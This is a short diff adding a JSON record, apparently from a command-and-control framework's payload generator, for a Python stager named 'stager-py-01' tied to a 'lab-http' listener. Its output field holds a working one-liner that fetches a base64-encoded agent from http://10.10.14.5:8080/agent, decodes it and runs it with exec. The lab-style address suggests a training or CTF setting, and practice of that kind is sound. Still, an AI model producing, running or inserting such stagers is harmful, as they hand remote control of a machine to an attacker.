@@ -1,0 +1,13 @@
+{
+  "id": 43,
+  "name": "stager-py-01",
+  "template": "multi_launcher",
+  "options": {
+    "Listener": "lab-http",
+    "Language": "python",
+    "Host": "10.10.14.5",
+    "Port": "8080",
+    "OutFile": ""
+  },
+  "output": "import sys,base64,urllib.request as u;exec(base64.b64decode(u.urlopen('http://10.10.14.5:8080/agent').read()))"
+}
